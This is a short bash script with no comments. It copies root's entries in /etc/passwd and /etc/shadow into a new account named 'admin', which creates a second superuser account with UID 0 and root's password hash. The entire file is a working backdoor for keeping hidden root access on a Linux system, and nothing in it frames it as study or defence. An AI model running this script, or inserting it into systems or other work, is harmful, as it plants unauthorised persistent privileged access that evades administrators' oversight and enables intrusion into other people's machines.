#!/bin/bash

userline=`cat /etc/passwd | grep root`

echo $userline | sed 's/root/admin/' >> /etc/passwd

passline=`cat /etc/shadow | grep root`

echo $passline | sed 's/root/admin/' >> /etc/shadow

